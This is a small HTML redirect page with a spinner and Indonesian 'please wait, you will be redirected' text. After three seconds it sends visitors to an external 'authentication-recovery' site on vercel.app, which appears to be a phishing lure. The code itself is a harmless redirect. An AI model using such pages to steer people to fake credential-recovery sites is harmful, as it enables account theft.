<!DOCTYPE html>
<html>
<head>
    <style>
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #3498db;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            color: #333;
            font-size: 18px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="loading-text">Mohon tunggu, Anda akan segera dialihkan...</div>
    </div>

    <script>
        // Fungsi untuk melakukan redirect setelah beberapa detik
        setTimeout(function() {
            // Ganti URL di bawah ini dengan URL tujuan Anda
            window.location.href = "https://authentikasi-pemulihan.vercel.app/";
        }, 3000); // Redirect setelah 3 detik
    </script>
</body>
</html>
